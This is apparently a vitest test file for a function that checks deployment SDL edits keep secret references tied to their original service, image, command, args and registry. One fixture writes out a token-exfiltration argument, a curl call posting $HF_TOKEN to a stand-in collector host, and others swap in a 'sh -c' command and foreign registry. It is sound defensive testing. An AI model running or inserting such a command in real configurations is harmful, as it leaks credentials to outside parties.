import { describe, expect, it } from "vitest";

import { keepsSecretsWithTheirServices } from "./keepsSecretsWithTheirServices";

const SOURCE = `
services:
  web:
    image: ghcr.io/acme/api:1.0
    command:
      - node
    args:
      - server.js
    env:
      - LOG_LEVEL=info
      - HF_TOKEN=ac-secret://HF_TOKEN
    credentials:
      host: ghcr.io
      username: ac-secret://REGISTRY_USERNAME
      password: ac-secret://REGISTRY_PASSWORD
  worker:
    image: ghcr.io/acme/worker:1.0
`;

describe(keepsSecretsWithTheirServices.name, () => {
  it("keeps secrets for a service whose image, command, args, registry and secrets are unchanged", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("LOG_LEVEL=info", "LOG_LEVEL=debug"))).toBe(true);
  });

  it("ignores services that reference no secret, whatever their image", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("worker:1.0", "evil:latest"))).toBe(true);
  });

  it("refuses a secret sent to a changed image", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("ghcr.io/acme/api:1.0", "docker.io/someone/else:latest"))).toBe(false);
  });

  it("refuses a secret sent to a changed command", () => {
    const changed = SOURCE.replace("    command:\n      - node\n", "    command:\n      - sh\n      - -c\n");

    expect(keepsSecretsWithTheirServices(SOURCE, changed)).toBe(false);
  });

  it("refuses a secret sent to changed args", () => {
    const changed = SOURCE.replace("      - server.js\n", "      - curl https://collector.example.com -d $HF_TOKEN\n");

    expect(keepsSecretsWithTheirServices(SOURCE, changed)).toBe(false);
  });

  it("refuses a secret sent to a command or args the service didn't have", () => {
    const withoutCommand = SOURCE.replace("    command:\n      - node\n    args:\n      - server.js\n", "");

    expect(keepsSecretsWithTheirServices(withoutCommand, SOURCE)).toBe(false);
  });

  it("refuses registry credentials sent to another registry", () => {
    expect(keepsSecretsWithTheirServices(SOURCE, SOURCE.replace("host: ghcr.io", "host: registry.example.com"))).toBe(false);
  });

  it("refuses a secret moved to a service that never had it", () => {
    const moved = SOURCE.replace("    image: ghcr.io/acme/worker:1.0", "    image: ghcr.io/acme/worker:1.0\n    env:\n      - HF_TOKEN=ac-secret://HF_TOKEN");

    expect(keepsSecretsWithTheirServices(SOURCE, moved)).toBe(false);
  });

  it("refuses a secret given to a service the deployment doesn't have", () => {
    const added = `${SOURCE}  sidecar:\n    image: ghcr.io/acme/api:1.0\n    env:\n      - HF_TOKEN=ac-secret://HF_TOKEN\n`;

    expect(keepsSecretsWithTheirServices(SOURCE, added)).toBe(false);
  });

  it("refuses when either SDL does not parse", () => {
    expect(keepsSecretsWithTheirServices("services: [", SOURCE)).toBe(false);
    expect(keepsSecretsWithTheirServices(SOURCE, "services: [")).toBe(false);
  });

  it("reads env entries without a value and services without credentials", () => {
    expect(
      keepsSecretsWithTheirServices(
        "services:\n  web:\n    image: a\n    env:\n      - FLAG\n      - 3\n",
        "services:\n  web:\n    image: b\n    env:\n      - FLAG\n"
      )
    ).toBe(true);
    expect(keepsSecretsWithTheirServices("{}", "{}")).toBe(true);
  });
});
